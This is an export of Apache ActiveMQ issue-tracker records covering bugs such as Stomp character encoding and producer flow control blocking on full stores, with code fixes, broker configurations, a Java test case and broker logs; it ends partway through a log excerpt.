Reference to http://activemq.org/ in http://activemq.apache.org/initial-configuration.html#InitialConfiguration-RelatedReading,AMQ-2686,12483272,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,bsnyder,sebb,,05/Apr/10 22:50,18/Jan/11 00:40,14/Jul/23 05:43,06/Apr/10 03:10,,,,,,,,,,,,,0,,,,,,,,,"The page http://activemq.apache.org/initial-configuration.html#InitialConfiguration-RelatedReading has a link:

<li>The ActiveMQ <a href=""http://activemq.org/"" rel=""nofollow"">Website</a> for specifics on how to use ActiveMQ</li>

Surely the ActiveMQ website is now http://www.activemq.apache.org/ ?

BTW, the URL http://activemq.org/ is not currently responding.
",http://activemq.apache.org/initial-configuration.html#InitialConfiguration-RelatedReading,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74845,,,Tue Apr 06 03:10:31 UTC 2010,,,,,,,,,,,"0|i182tj:",255259,,,,,,,,,,,,,,,,,,,,,"06/Apr/10 03:10;bsnyder;Fixed in the wiki. The change will be auto-exported soon. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Incorrect character encoding/decoding when using websocket/stomp transport,AMQ-2684,12483273,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,bluemilk,bluemilk,03/Apr/10 14:51,06/Apr/10 11:04,14/Jul/23 05:43,06/Apr/10 11:04,5.4.0,,,,,5.4.0,,,Transport,,,,0,,,,,,,,,"Non ANSI-characters sent over the websocket/stomp transport are not encoded/decoded correctly. In my case client and server are using UTF-8 for character encoding. 

Changing StompSocket.onMessage(byte frame, String data) to
{noformat}
  public void onMessage(byte frame, String data) {}
       try {
            protocolConverter.onStompCommand((StompFrame)wireFormat.unmarshal(new ByteSequence(data.getBytes(""UTF-8""))));
       } catch (Exception e) {
            onException(IOExceptionSupport.create(e));
       }
   }
{noformat}

and StompFrame.toString() to

{noformat}
  public String toString() {
        StringBuffer buffer = new StringBuffer();
        buffer.append(getAction());
        buffer.append(""\n"");
        Map headers = getHeaders();
        for (Iterator iter = headers.entrySet().iterator(); iter.hasNext();) {
            Map.Entry entry = (Map.Entry)iter.next();
            buffer.append(entry.getKey());
            buffer.append("":"");
            buffer.append(entry.getValue());
            buffer.append(""\n"");
        }
        buffer.append(""\n"");
        if (getContent() != null) {
            try {
                buffer.append(new String(getContent(), ""UTF-8""));
            } catch (Throwable e) {
                buffer.append(Arrays.toString(getContent()));
            }
        }
        return buffer.toString();
    }
{noformat}

solved the problem for me. The changes are minor, I only specified the encoding when reading bytes arrays. 

Maybe there should be a way to configure the encoding to be used...","Windows 7 64bit
Java 1.6.0_18",bluemilk,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Apr/10 14:57;bluemilk;StompFrame.java;https://issues.apache.org/jira/secure/attachment/12461650/StompFrame.java","03/Apr/10 14:57;bluemilk;StompSocket.java;https://issues.apache.org/jira/secure/attachment/12461649/StompSocket.java",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74846,,,Tue Apr 06 11:04:40 UTC 2010,,,,,,,,,,,"0|i0rpyn:",159850,,,,,,,,,,,,,,,,,,,,,"06/Apr/10 08:19;dejanb;Fixed with svn revision 931047. Thanks.;;;","06/Apr/10 10:52;bluemilk;I guess character encoding should also be specified for the StompFrame.getBody() method to keep everything consistent.

 StompFrame.java
{noformat}
    public String getBody() {
        try {
            return new String(content, ""UTF-8"");
        } catch (Throwable e) {			
            return Arrays.toString(getContent());
        }
    }
{noformat}
;;;","06/Apr/10 11:04;dejanb;Good spot. Fixed in svn revision 931089;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Producer Flow Control Does Not Seem to Work with Topics,AMQ-2683,12483568,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,dejanb,odysseyfx,odysseyfx,02/Apr/10 22:22,27/Dec/10 12:34,14/Jul/23 05:43,27/Dec/10 12:34,5.3.0,5.3.1,,,,5.5.0,,,Broker,,,,2,,,,,,,,,"I have multiple producers posting messages to queues and adding statistical information to a topic.  I have one consumer of that topic subscribing and taking those messages and monitors for problems.  The consumer is slower than publishing to the topic.  I have flow control enabled and I expected that once the memory limit of the Consumers dispatch queue was reached it would throttle the publishers to the topic, but instead it seems to lock everything up.

The message producers are putting messages to each queue and the topic on separate sessions.  The broker basically stops once it posts the message that it's going to throttle producers.  The topic messages are messages with text attributes, they are non persistent and posted non-transactional using the AUTO_ACKNOWLEDGE mode.

All the producers and consumers use the same Connection factory with with these attributes set.

ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(brokerURI);
factory.setProducerWindowSize(1024 * 1024);
factory.getPrefetchPolicy().setTopicPrefetch(10);


My activemq config is as follows:

    <broker xmlns=""http://activemq.apache.org/schema/core"" brokerName=""localhost"" dataDirectory=""${activemq.base}/data"" destroyApplicationContextOnStop=""true"">
 
        <!--
			For better performances use VM cursor and small memory limit.
			For more information, see:
            
            http://activemq.apache.org/message-cursors.html
            
            Also, if your producer is ""hanging"", it's probably due to producer flow control.
            For more information, see:
            http://activemq.apache.org/producer-flow-control.html
        -->
              
        <destinationPolicy>
            <policyMap>
              <policyEntries>
                <policyEntry topic="">"" producerFlowControl=""true"" memoryLimit=""15mb"">
                  <pendingSubscriberPolicy>
                    <vmCursor />
                  </pendingSubscriberPolicy>
                </policyEntry>
                <policyEntry queue="">"" producerFlowControl=""true"" memoryLimit=""15mb"">
                  <!-- Use VM cursor for better latency
                       For more information, see:
                       
                       http://activemq.apache.org/message-cursors.html
                       
                  <pendingQueuePolicy>
                    <vmQueueCursor/>
                  </pendingQueuePolicy>
                  -->
                </policyEntry>
              </policyEntries>
            </policyMap>
        </destinationPolicy> 
 
        
        <!-- 
            The managementContext is used to configure how ActiveMQ is exposed in 
            JMX. By default, ActiveMQ uses the MBean server that is started by 
            the JVM. For more information, see: 
            
            http://activemq.apache.org/jmx.html 
        -->
        <managementContext>
            <managementContext createConnector=""false""/>
        </managementContext>

        <!-- 
            Configure message persistence for the broker. The default persistence
            mechanism is the KahaDB store (identified by the kahaDB tag). 
            For more information, see: 
            
            http://activemq.apache.org/persistence.html 
        -->
        <persistenceAdapter>
            <kahaDB directory=""${activemq.base}/data/kahadb"" journalMaxFileLength=""5 mb""/>
        </persistenceAdapter>
        
        
        <!--
            The systemUsage controls the maximum amount of space the broker will 
            use before slowing down producers. For more information, see:
            
            http://activemq.apache.org/producer-flow-control.html
        -->     
        <systemUsage>
            <systemUsage>
                <memoryUsage>
                    <memoryUsage limit=""200 mb""/>
                </memoryUsage>
                <storeUsage>
                    <storeUsage limit=""50 gb""/>
                </storeUsage>
                <tempUsage>
                    <tempUsage limit=""100 mb""/>
                </tempUsage>
            </systemUsage>
        </systemUsage>
	
		  
        <!-- 
            The transport connectors expose ActiveMQ over a given protocol to
            clients and other brokers. For more information, see: 
            
            http://activemq.apache.org/configuring-transports.html 
        -->
        <transportConnectors>
            <transportConnector name=""openwire"" uri=""tcp://0.0.0.0:61616""/>
        </transportConnectors>

    </broker>
","Windows 2008 Server, Sun Java 6. ",mdirkse,odysseyfx,srpietrowicz,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14785,,,Mon Dec 27 12:34:46 UTC 2010,,,,,,,,,,,"0|i0akhb:",59591,,,,,,,,,,,,,,,,,,,,,"14/Jul/10 01:29;srpietrowicz;I'm seeing this same issue, same results.;;;","14/Jul/10 09:40;gtully;could you build a test case that can demonstrate, possibly a topic version of http://svn.apache.org/viewvc/activemq/trunk/activemq-core/src/test/java/org/apache/activemq/ProducerFlowControlTest.java?view=markup;;;","23/Dec/10 15:42;mdirkse;Well, it's not a topic version of the PFC test in the AMQ source, but I'm pretty confident it does demonstrate that PFC doesn't work for topics.
If you run the code you'll see the producer halt when PFC kicks in, and never start up again, even when the consumer has consumed all outstanding messages. If you change the Destination from a topic to a queue, PFC does work as expected. 

{code}
import java.util.Arrays;
import java.util.concurrent.atomic.AtomicLong;

import javax.jms.Connection;
import javax.jms.Destination;
import javax.jms.Message;
import javax.jms.MessageListener;
import javax.jms.MessageProducer;
import javax.jms.Session;

import org.apache.activemq.ActiveMQConnectionFactory;
import org.apache.activemq.broker.BrokerService;
import org.apache.activemq.broker.region.policy.PolicyEntry;
import org.apache.activemq.broker.region.policy.PolicyMap;
import org.apache.activemq.command.ActiveMQTopic;
import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;

public class BrokerTest implements MessageListener {
  private static final Log log = LogFactory.getLog(BrokerTest.class);
  private static final String brokerName = ""testBroker"";
  private static final String brokerUrl = ""vm://"" + brokerName;
  private static final int destinationMemLimit = 2097152; // 2MB
  private static final AtomicLong produced = new AtomicLong();
  private static final AtomicLong consumed = new AtomicLong();

  public static void main(String[] args) throws Exception {
    // Setup and start the broker
    BrokerService broker = new BrokerService();
    broker.setBrokerName(brokerName);
    broker.setPersistent(false);
    broker.setSchedulerSupport(false);
    broker.setUseJmx(false);
    broker.setUseShutdownHook(false);
    broker.addConnector(brokerUrl);

    // Setup the destination policy
    PolicyMap pm = new PolicyMap();

    // Setup the topic destination policy
    PolicyEntry tpe = new PolicyEntry();
    tpe.setTopic("">"");
    tpe.setMemoryLimit(destinationMemLimit);
    tpe.setProducerFlowControl(true);

    // Setup the topic destination policy
    PolicyEntry qpe = new PolicyEntry();
    qpe.setQueue("">"");
    qpe.setMemoryLimit(destinationMemLimit);
    qpe.setProducerFlowControl(true);
    qpe.setQueuePrefetch(1);

    pm.setPolicyEntries(Arrays.asList(new PolicyEntry[] { tpe, qpe }));

    broker.setDestinationPolicy(pm);

    // Start the broker
    broker.start();

    Destination destination = new ActiveMQTopic(""test"");
    //Destination destination = new ActiveMQQueue(""test"");

    // Create the connection factory
    ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory(brokerUrl);
    connectionFactory.setAlwaysSyncSend(true);
    connectionFactory.setProducerWindowSize(1024);

    // Start the test destination listener
    Connection c = connectionFactory.createConnection();
    c.start();
    c.createSession(false, 1).createConsumer(destination).setMessageListener(new BrokerTest());

    // Start producing the test messages
    Session s = connectionFactory.createConnection().createSession(false, Session.AUTO_ACKNOWLEDGE);
    MessageProducer p = s.createProducer(destination);

    for (long i = 0; i < 2000000L; i++) {
      p.send(s.createTextMessage(""test""));

      long count = produced.incrementAndGet();
      if (count % 1000 == 0) {
        log.debug(""Produced "" + count / 1000 + ""k messages"");
      }
    }
  }

  @Override
  public void onMessage(Message arg0) {
    try {
      Thread.sleep(1);
    } catch (InterruptedException e) {
      e.printStackTrace();
    }

    long count = consumed.incrementAndGet();
    if (count % 1000 == 0) {
      log.debug(""\tConsumed "" + count / 1000 + ""k messages"");
    }
  }
}
{code};;;","23/Dec/10 16:39;mdirkse;The testcase does not work as expected (ie PFC doesn't work for topics) for both 5.4.2 and 5.5-snapshot.;;;","27/Dec/10 12:34;dejanb;Fixed with svn revision 1053055. The test based on the one Maarten provided is included as well. Thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
apr_version and apu_version issues (apr) in configure file,AMQ-2682,12482825,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,jamauld,jamauld,01/Apr/10 16:29,09/Jul/10 23:01,14/Jul/23 05:43,09/Jul/10 23:01,,,,,,5.4.0,,,CMS (C++ client),,,,0,,,,,,,,,"I was having difficulty running ./configure to set up ActiveMQ.  I am running Red Hat Linux Enterprise 5 at Sandia National Labs.

There were two problems.  First, the apr version I had on my machine, after installing apache web server 2.2, was version 1.4.2.  The variable APR_VER_REGEXES was set up so 1.3.* was expected, and 1.4.* was not.  The documentaion indicates that version 1.4.2 should be sufficiently advanced.

Second, the apr util version I had was 1.3.9.  When I changed APR_VER_REGEXES to expect 1.4.*, it started reporting that I had the wrong apr util version, even though I still had APU_VER_REGEXES set to expect 1.3.*

It turned out that there was an incorrect line, which worked okay if apr and apr util had the same version.  The original line was:
    if test `expr $apr_version : $apu_wanted_regex` -ne 0; then
the corrected line is
    if test `expr $apu_version : $apu_wanted_regex` -ne 0; then

notice that the apr version (apr_version) was being compared to the apr util expected regular expression (apu_wanted_regex).  I fixed it by changing apr_version in the line to apu_version.


","Red Hat Enterprise 5, after installation of apache 2.2 (http-2.2.15)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74847,,,Fri Jul 09 23:01:43 UTC 2010,,,,,,,,,,,"0|i0rqkf:",159948,,,,,,,,,,,,,,,,,,,,,"09/Jul/10 23:01;tabish;This is really an ActiveMQ-CPP issue.;;;","09/Jul/10 23:01;tabish;This was resolved in the ActiveMQ-CPP 3.2.0 release.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
set findMessageStatement cause problem for JDBCPersistenceAdapter due to error in Statements.java,AMQ-2681,12483290,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Blocker,Fixed,dejanb,yinghe0101,yinghe0101,31/Mar/10 15:31,07/May/10 07:18,14/Jul/23 05:43,07/May/10 07:18,5.3.1,,,,,5.4.0,,,,,,,0,,,,,,,,,"field findMessageByIdStatement in org.apache.activemq.store.jdbc.Statements.java is never used and getFindMessageByIdStatement is using findMessageStatement which causes problem. Because if someone overwrite the default findMessageStatement, it will cause doGetMessageById to fail.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/Apr/10 15:03;yinghe0101;AMQ-2681-2-trunk.patch;https://issues.apache.org/jira/secure/attachment/12461645/AMQ-2681-2-trunk.patch","31/Mar/10 15:33;yinghe0101;AMQ-2681.patch;https://issues.apache.org/jira/secure/attachment/12461648/AMQ-2681.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74848,,,Fri May 07 07:18:07 UTC 2010,,,,,,,Patch Available,,,,"0|i0rpnb:",159799,,,,,,,,,,,,,,,,,,,,,"31/Mar/10 15:33;yinghe0101;AMQ-2681.patch fix the problem and make find findMessageByIdStatement settable;;;","01/Apr/10 10:56;dejanb;Patch committed with thanks.;;;","01/Apr/10 15:03;yinghe0101;AMQ-2681-2-trunk.patch fixes:
removeMessageStatement has a typo missing a ""e"". 
GenerateJDBCStatements.java will generate the default sql statements for jdbc persistence in spring bean format so people can tune the sql  so I put in in util;;;","02/Apr/10 09:42;dejanb;Patch applied with svn revision 930206. Thanks Ying. 

GenerateJDBCStatements is useful, but it would be even more useful if it would use specified database dialect as persistence adapters do. You can take a look at JDBCPersistenceAdapter.start() for example on how it can be done. Also, it'd be good to have this as an option that could be executed from the command line, so that folks can create statements, when they're deploying the broker (maybe activemq-admin command with some new switch). Interested in implementing some of these?

Cheers;;;","07/May/10 07:18;dejanb;Will resolve this for now;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Producer Flow Control seems to be broken,AMQ-2680,12483425,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,gtully,scoopex,scoopex,30/Mar/10 08:48,23/Apr/10 15:20,14/Jul/23 05:43,23/Apr/10 15:20,5.3.1,,,,,5.4.0,,,Broker,Documentation,,,1,,,,,,,,,"How to reproduce:

- Download ActiveMQ 5.3.1
- Start broker with the attached configuration
   ---
   <systemUsage>
       <systemUsage>
           <memoryUsage>
               <memoryUsage limit=""10 mb""/>
           </memoryUsage>
           <storeUsage>
               <storeUsage limit=""10 mb"" name=""queue/RemoteQ""/>
           </storeUsage>
           <tempUsage>
               <tempUsage limit=""3 gb""/>
           </tempUsage>
       </systemUsage>
   </systemUsage>
   ---
- Start example producer/consumer
   cd examples
   ant producer -Durl=tcp://127.0.0.1:61616 -Dmax=100000 -Dsubject=queue/RemoteQ -Ddurable=true -DsleepTime=2
   sleep 600
   ant consumer -Durl=tcp://127.0.0.1:61616  -Dsubject=queue/RemoteQ -Dmax=100000 -DsleepTime=2

The problem: 
When the 10mb limit is reached, the producer is blocked forever.
The expected behavior is, that if a consumer cleans the queue, producers are able to post more messages.
Neither cleaning up the queue, restarting producers and restarting the broker helps :-(

It would be also a good idea to enhance the documentation about producer-flow-control:
(http://activemq.apache.org/producer-flow-control.html)
- expected behavior
- what is limited in detail by using system|store|tempUsage 

The entire configuration :
---
<beans
  xmlns=""http://www.springframework.org/schema/beans""
  xmlns:amq=""http://activemq.apache.org/schema/core""
  xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
  xsi:schemaLocation=""http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.0.xsd
  http://activemq.apache.org/schema/core http://activemq.apache.org/schema/core/activemq-core.xsd"">

    <bean class=""org.springframework.beans.factory.config.PropertyPlaceholderConfigurer"">
        <property name=""locations"">
            <value>file:${activemq.base}/conf/credentials.properties</value>
        </property>      
    </bean>

    <broker xmlns=""http://activemq.apache.org/schema/core"" brokerName=""localhost"" dataDirectory=""${activemq.data}/data"" >

        <destinationPolicy>
            <policyMap>
              <policyEntries>

                <policyEntry topic="">"" producerFlowControl=""true"" memoryLimit=""10mb"">

                  <deadLetterStrategy>
                    <!--
                      Use the prefix 'DLQ.' for the destination name, and make
                      the DLQ a queue rather than a topic
                    -->
                    <individualDeadLetterStrategy
                      queuePrefix=""DLQ."" useQueueForQueueMessages=""true"" />
                  </deadLetterStrategy>

                  <pendingSubscriberPolicy>
                    <vmCursor />
                  </pendingSubscriberPolicy>
                </policyEntry>
                <policyEntry queue="">"" producerFlowControl=""true"" memoryLimit=""10mb"">
                  <!-- Use VM cursor for better latency
                       For more information, see:
                       
                       http://activemq.apache.org/message-cursors.html
                       
                  <pendingQueuePolicy>
                    <vmQueueCursor/>
                  </pendingQueuePolicy>
                  -->
                  <deadLetterStrategy>
                    <!--
                      Use the prefix 'DLQ.' for the destination name, and make
                      the DLQ a queue rather than a topic
                    -->
                    <individualDeadLetterStrategy
                      queuePrefix=""DLQ."" useQueueForQueueMessages=""true"" />
                  </deadLetterStrategy>


                </policyEntry>
              </policyEntries>
            </policyMap>
        </destinationPolicy> 
 
        <systemUsage>
            <systemUsage>
                <memoryUsage>
                    <memoryUsage limit=""10 mb""/>
                </memoryUsage>
                <storeUsage>
                    <storeUsage limit=""10 mb"" name=""queue/RemoteQ""/>
                </storeUsage>
                <tempUsage>
                    <tempUsage limit=""3 gb""/>
                </tempUsage>
            </systemUsage>
        </systemUsage>
                  
        <transportConnectors>
            <transportConnector name=""openwire"" uri=""tcp://0.0.0.0:61616""/>
        </transportConnectors>

    </broker>

    <import resource=""jetty.xml""/>
    
</beans>
---
","SLES 11, IBM JDK 1.6",mdirkse,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Apr/10 10:48;scoopex;activemq-broken-flow-control.xml;https://issues.apache.org/jira/secure/attachment/12461664/activemq-broken-flow-control.xml","30/Mar/10 08:49;scoopex;activemq.xml;https://issues.apache.org/jira/secure/attachment/12461643/activemq.xml","08/Apr/10 10:32;scoopex;producer-flow-control-problem.zip;https://issues.apache.org/jira/secure/attachment/12461646/producer-flow-control-problem.zip",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,43791,,,Fri Apr 23 15:20:52 UTC 2010,,,,,,,,,,,"0|i0rpon:",159805,,,,,,,,,,,,,,,,,,,,,"31/Mar/10 09:13;gtully;I have not looked at this in detail but my guess is that this is blocked on store usage and the store is not reclaimed when the queue is drained because of the default datafile size of the store. A data file can only be reclaimed when it is not referenced any more, which requires many small data files in your case. I think, you need to configure the persistence adapter to have a data file size less that 10mb for this to work as you expect.;;;","31/Mar/10 09:47;scoopex;Additional information:

If i execute the described steps, ActiveMQ logs the following message:
--- 
 INFO | Usage Manager Store is Full. Producer (ID:XXXXXXXXXXX-43726-1270028281473-0:0:1:1) stopped to prevent flooding queue://queue/RemoteQ. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 30s)
---
This message appears many time, ""blocking for : XXs"" is increased by 30s steps....

After that, it is not possible to enqueue or dequeue any message!

This also happens with the following settings:
(datafile 32mb, storeUsage 40mb)
---
         <persistenceAdapter>
            <amqPersistenceAdapter directory=""/srv/activemq/work/data"" maxFileLength=""32mb"" 
             persistentIndex=""true"" indexBinSize=""32768"" indexPageSize=""32768"" />
         </persistenceAdapter>
......
......
        <systemUsage>
            <systemUsage>
                <memoryUsage>
                    <memoryUsage limit=""10 mb""/>
                </memoryUsage>
                <storeUsage>
                    <storeUsage limit=""40 mb"" name=""queue/RemoteQ""/>
                    <storeUsage limit=""40 mb"" name=""queue/RemoteQ""/>
                </storeUsage>
                <tempUsage>
                    <tempUsage limit=""3 gb""/>
                </tempUsage>
            </systemUsage>
        </systemUsage>
---
;;;","01/Apr/10 09:32;gtully;The problem is the configured maxFileLength, it is too large for cleanup. The ampPeristenceAdapter will not delete the first or current journal data file during store cleanup, so in order for some space to be reclaimed on a cleanup there must be at least 3 data files in the journal. For a 40mb store limit 3 15MB files does the trick. This allows cleanup to have an effect. Your scenario works as expected with the following configuration:{code}
<persistenceAdapter>
<amqPersistenceAdapter directory=""${activemq.base}/data/amq"" maxFileLength=""15mb""
persistentIndex=""true"" indexBinSize=""32768"" indexPageSize=""32768"" />
</persistenceAdapter>{code}

Btw: for faster recovery of large stores and for more linear enqueue rates, the kahaDB store will give better results. Similar config is needed w.r.t to store data file size.;;;","01/Apr/10 10:15;gtully;The key is understanding how the store is reclaimed, it depends on a data fixe being unreferenced. In essence this means there needs to be more than one data file in operation. For the amq store, more than 2 when a store limit is reached.;;;","07/Apr/10 10:47;scoopex;Thanks for the configuration hints.
 
It seems now working as expected.
I strongly recommend to put some logic in the configuration handling to detect bda configurations like that - sysadmins do normally not know details about the internals of the activemq message store implementation.

Nevertheless it seems that there is still a bug - after some time my messagequeue stopped receiving messages:
(mention the configuration attached as activemq-broken-flow-control.xml)

- Shutdown of producer was not possible
- Shutdown of broker was not possible (kill -KILL was the only solution)
- After restart the blocked queue does still not have any pending messages, but the queue is still
  blocked  by producer flow control
  (created a threaddump with a SUN jvm, by executing kill -QUIT, see beyond)

Threadump;:
{code}
ACTIVEMQ_HOME: /srv/activemq/install/current
ACTIVEMQ_BASE: /srv/activemq/install/current
Loading message broker from: xbean:activemq.xml
 INFO | Using Persistence Adapter: AMQPersistenceAdapter(/srv/activemq/work/data)
 INFO | AMQStore starting using directory: /srv/activemq/work/data
 INFO | Kaha Store using data directory /srv/activemq/work/data/kr-store/state
 INFO | JMX consoles can connect to service:jmx:rmi:///jndi/rmi://localhost:51109/jmxrmi
 INFO | Active data files: [1, 2, 3]
 INFO | ActiveMQ 5.3.1 JMS Message Broker (localhost) is starting
 INFO | For help or more information please see: http://activemq.apache.org/
 INFO | Kaha Store using data directory /srv/activemq/work/data/kr-store/data
 INFO | Listening for connections at: tcp://esxschnapp3-x3850.argl.iv.FOOBAR.de:61616
 INFO | Connector openwire Started
 INFO | ActiveMQ JMS Message Broker (localhost, ID:esxschnapp3-x3850.argl.iv.FOOBAR.de-48924-1270635425111-0:0) started
 INFO | Logging to org.slf4j.impl.JCLLoggerAdapter(org.mortbay.log) via org.mortbay.log.Slf4jLog
 INFO | jetty-6.1.9
 INFO | ActiveMQ WebConsole initialized.
 INFO | Initializing Spring FrameworkServlet 'dispatcher'
 INFO | ActiveMQ Console at http://0.0.0.0:8161/admin
 INFO | Initializing Spring root WebApplicationContext
 INFO | Successfully connected to tcp://localhost:61616
 INFO | Camel Console at http://0.0.0.0:8161/camel
 INFO | ActiveMQ Web Demos at http://0.0.0.0:8161/demo
 INFO | RESTful file access application at http://0.0.0.0:8161/fileserver
 INFO | Started SelectChannelConnector@0.0.0.0:8161
 INFO | Usage Manager Store is Full. Producer (ID:HOST2-9828-1270572546517-0:17247:1:1) stopped to prevent flooding queue://queue/Einarbeitungsdaten_RemoteQ. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 30s)
 INFO | Usage Manager Store is Full. Producer (ID:HOST2-12587-1270572565654-0:22380:1:1) stopped to prevent flooding queue://queue/Initialdaten_RemoteQ. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 30s)
 INFO | Usage Manager Store is Full. Producer (ID:HOST2-9828-1270572546517-0:17247:1:1) stopped to prevent flooding queue://queue/Einarbeitungsdaten_RemoteQ. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 60s)
 INFO | Usage Manager Store is Full. Producer (ID:HOST2-12587-1270572565654-0:22380:1:1) stopped to prevent flooding queue://queue/Initialdaten_RemoteQ. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 60s)
 INFO | Usage Manager Store is Full. Producer (ID:HOST2-12587-1270572565654-0:22380:1:1) stopped to prevent flooding queue://queue/Initialdaten_RemoteQ. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 90s)
 INFO | Usage Manager Store is Full. Producer (ID:HOST2-46261-1270635495961-0:0:6:1) stopped to prevent flooding queue://queue/Einarbeitungsdaten_RemoteQ. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 30s)
 INFO | Usage Manager Store is Full. Producer (ID:HOST2-12587-1270572565654-0:22380:1:1) stopped to prevent flooding queue://queue/Initialdaten_RemoteQ. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 120s)
 INFO | Usage Manager Store is Full. Producer (ID:HOST2-46261-1270635495961-0:0:6:1) stopped to prevent flooding queue://queue/Einarbeitungsdaten_RemoteQ. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 60s)
 INFO | Usage Manager Store is Full. Producer (ID:HOST2-12587-1270572565654-0:22380:1:1) stopped to prevent flooding queue://queue/Initialdaten_RemoteQ. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 150s)
 INFO | Usage Manager Store is Full. Producer (ID:HOST2-46261-1270635495961-0:0:6:1) stopped to prevent flooding queue://queue/Einarbeitungsdaten_RemoteQ. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 90s)
 INFO | Usage Manager Store is Full. Producer (ID:HOST2-12587-1270572565654-0:22380:1:1) stopped to prevent flooding queue://queue/Initialdaten_RemoteQ. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 180s)
